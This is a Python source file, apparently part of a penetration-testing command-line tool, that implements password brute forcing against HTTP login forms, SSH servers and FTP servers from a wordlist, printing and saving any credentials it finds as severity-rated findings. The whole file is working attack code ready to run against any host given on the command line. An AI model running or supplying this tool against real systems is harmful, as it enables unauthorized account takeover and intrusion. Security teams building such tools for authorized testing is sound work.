from __future__ import annotations

import asyncio
import ftplib
from typing import Callable, Optional

import typer

from probe.config import add_finding, new_session, save_session
from probe.utils.display import console as rich_console, print_panel
from probe.utils.http import async_client
from probe.utils.wordlist import load_wordlist

app = typer.Typer(help="Credential brute force: HTTP, SSH, FTP")

_DEFAULT_SUCCESS_CODES = {200, 301, 302}
_DEFAULT_FAILURE_STRINGS = [
    "invalid",
    "incorrect",
    "wrong",
    "failed",
    "failure",
    "error",
    "denied",
    "unauthorized",
]


def _is_success(response) -> bool:
    if response.status_code not in _DEFAULT_SUCCESS_CODES:
        return False
    body = response.text.lower()
    return not any(marker in body for marker in _DEFAULT_FAILURE_STRINGS)


async def brute_http(
    url: str,
    username: str,
    passwords: list[str],
    post_func: Callable,
    user_field: str = "username",
    pass_field: str = "password",
    delay: float = 0.0,
) -> Optional[str]:
    for password in passwords:
        try:
            response = await post_func(
                url,
                data={user_field: username, pass_field: password},
            )
            if _is_success(response):
                return password
        except Exception:
            pass
        if delay > 0:
            await asyncio.sleep(delay)
    return None


def _ftp_login(host: str, user: str, passwd: str, port: int = 21, timeout: float = 10.0) -> None:
    ftp = ftplib.FTP(timeout=timeout)
    try:
        ftp.connect(host, port)
        ftp.login(user, passwd)
    finally:
        try:
            ftp.quit()
        except Exception:
            pass


def brute_ftp(
    host: str,
    username: str,
    passwords: list[str],
    port: int = 21,
    timeout: float = 10.0,
) -> Optional[str]:
    for password in passwords:
        try:
            if port == 21 and timeout == 10.0:
                _ftp_login(host, username, password)
            else:
                _ftp_login(host, username, password, port=port, timeout=timeout)
            return password
        except ftplib.error_perm:
            continue
        except Exception:
            continue
    return None


def brute_ssh(
    host: str,
    username: str,
    passwords: list[str],
    port: int = 22,
    timeout: float = 5.0,
) -> Optional[str]:
    try:
        import paramiko
    except ImportError as exc:
        raise RuntimeError("paramiko is required for SSH brute force") from exc

    for password in passwords:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                host,
                port=port,
                username=username,
                password=password,
                timeout=timeout,
                banner_timeout=timeout,
                auth_timeout=timeout,
                look_for_keys=False,
                allow_agent=False,
            )
            return password
        except paramiko.AuthenticationException:
            continue
        except Exception:
            continue
        finally:
            client.close()
    return None


@app.command("http")
def cmd_http(
    url: str,
    user: str = typer.Option(..., "--user", "-u", help="Username to test"),
    wordlist: str = typer.Option(..., "--wordlist", "-w", help="Password wordlist path"),
    delay: float = typer.Option(0.0, "--delay", help="Delay between attempts in seconds"),
    user_field: str = typer.Option("username", "--user-field", help="HTTP form username field"),
    pass_field: str = typer.Option("password", "--pass-field", help="HTTP form password field"),
):
    """Brute force an HTTP login form."""
    passwords = load_wordlist(wordlist)
    session = new_session(url, ["cred"])
    rich_console.print(f"[cyan]HTTP brute force {url} ({len(passwords)} passwords)...[/cyan]")

    async def run() -> Optional[str]:
        async with async_client() as client:
            async def post(u, data=None, **kwargs):
                return await client.post(u, data=data)

            return await brute_http(url, user, passwords, post, user_field, pass_field, delay)

    result = asyncio.run(run())
    if result:
        print_panel("Found", f"[green]{user}:{result}[/green]")
        add_finding(session, "cred", "http_brute", "HIGH", username=user, password=result)
    else:
        rich_console.print("[red]No valid credentials found[/red]")
    save_session(session)


@app.command("ssh")
def cmd_ssh(
    host: str,
    user: str = typer.Option(..., "--user", "-u", help="Username to test"),
    wordlist: str = typer.Option(..., "--wordlist", "-w", help="Password wordlist path"),
    port: int = typer.Option(22, "--port", "-p", help="SSH port"),
):
    """Brute force SSH credentials."""
    passwords = load_wordlist(wordlist)
    session = new_session(host, ["cred"])
    rich_console.print(f"[cyan]SSH brute force {host}:{port} ({len(passwords)} passwords)...[/cyan]")

    result = brute_ssh(host, user, passwords, port=port)
    if result:
        print_panel("Found", f"[green]{user}:{result}[/green]")
        add_finding(session, "cred", "ssh_brute", "CRITICAL", username=user, password=result)
    else:
        rich_console.print("[red]No valid credentials found[/red]")
    save_session(session)


@app.command("ftp")
def cmd_ftp(
    host: str,
    user: str = typer.Option(..., "--user", "-u", help="Username to test"),
    wordlist: str = typer.Option(..., "--wordlist", "-w", help="Password wordlist path"),
    port: int = typer.Option(21, "--port", "-p", help="FTP port"),
):
    """Brute force FTP credentials."""
    passwords = load_wordlist(wordlist)
    session = new_session(host, ["cred"])
    rich_console.print(f"[cyan]FTP brute force {host}:{port} ({len(passwords)} passwords)...[/cyan]")

    result = brute_ftp(host, user, passwords, port=port)
    if result:
        print_panel("Found", f"[green]{user}:{result}[/green]")
        add_finding(session, "cred", "ftp_brute", "HIGH", username=user, password=result)
    else:
        rich_console.print("[red]No valid credentials found[/red]")
    save_session(session)
